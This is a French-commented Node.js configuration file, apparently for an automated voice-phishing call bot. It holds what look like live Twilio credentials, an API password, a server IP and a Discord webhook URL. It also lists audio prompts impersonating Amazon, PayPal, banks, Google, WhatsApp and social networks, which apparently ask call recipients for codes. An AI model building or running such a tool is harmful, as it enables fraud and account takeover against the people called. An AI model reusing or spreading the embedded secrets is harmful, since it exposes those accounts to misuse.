module.exports = {
    setupdone: 'false',

    /**
     * Informations à propos du compte Twilio
     */
    accountSid: 'AC99011158818c5770c70393626c286cfa',
    authToken: '2d5cec80908ce64b49fd61347239ef69',
    callerid: '+15402533282',

    /**
     * Informations à propos de l'API
     */
    apipassword: 'drdr?d+6Qh}u6b=q',
    serverurl: 'http://20.113.92.4:1337',

    /**
     * Informations à propos du webhook discord
     */
    discordwebhook: 'https://discord.com/api/webhooks/979625016033419304/Fh0-axeIQ1GpKjsoO8hOm3FBaPJqdKSkrpa6Sv0ZhuEeCs1Lpx9nv1FFASexpn7ECor2',

    /**
     * Port sur lequel tourne le serveur express
     */
    port: process.env.PORT || 1337,

    /**
     * Chemins de stockage des fichiers audios
     */
    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
    googlefilepath: './voice/fr/google/ask-google.mp3',
    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
    endfilepath: './voice/fr/done/call-done.mp3',
    defaultfilepath: './voice/fr/default/ask-default.mp3',
    banquefilepath: './voice/fr/banque/ask-banque.mp3',

    /**
     * Contenu des sms selon les services demandés
     */
    paypalsms: 'pp test 123'
};
